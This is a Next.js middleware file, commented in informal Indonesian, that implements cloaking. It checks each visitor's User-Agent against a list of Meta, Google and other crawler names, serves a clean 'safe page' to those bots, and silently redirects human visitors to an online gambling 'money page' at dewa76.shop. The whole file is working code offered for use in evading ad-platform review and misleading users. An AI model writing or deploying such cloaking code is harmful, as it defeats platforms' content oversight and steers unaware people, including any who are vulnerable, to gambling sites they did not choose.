import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';

export function middleware(request: NextRequest) {
  // 1. Ambil data User-Agent dari pengunjung
  const userAgent = request.headers.get('user-agent') || '';
  
  // URL situs iGaming yang baru lu beli
  const MONEY_PAGE = 'https://dewa76.shop'; 

  // 2. Daftar Hitam (Blacklist) Robot & Crawler Meta/Google
  // Ini adalah kata kunci yang dipakai oleh robot pemeriksa iklan
  const botKeywords = [
    'facebookexternalhit', 
    'Facebot', 
    'MetaURI', 
    'WhatsApp',
    'Googlebot', 
    'Bingbot',
    'Slurp', 
    'DuckDuckBot',
    'bot', 
    'crawler', 
    'spider'
  ];

  // Cek apakah User-Agent pengunjung mengandung kata kunci bot di atas
  const isBot = botKeywords.some(bot => 
    userAgent.toLowerCase().includes(bot.toLowerCase())
  );

  // 3. LOGIKA PERSIMPANGAN (CLOAKING)
  if (isBot) {
    // JALUR A: Kalau terdeteksi robot Meta, biarkan mereka masuk
    // NextResponse.next() artinya Vercel akan menampilkan artikel bersih lu
    console.log("ROBOT TERDETEKSI! Menampilkan Safe Page.");
    return NextResponse.next();
  }

  // JALUR B: Kalau manusia pakai HP biasa, pantulkan ke Money Page!
  // NextResponse.redirect(URL) akan melempar mereka tanpa mereka sadari
  console.log("MANUSIA TERDETEKSI! Melempar ke Money Page.");
  return NextResponse.redirect(MONEY_PAGE);
}

// Konfigurasi agar script ini hanya jalan di rute utama (Homepage)
export const config = {
  matcher: '/', 
};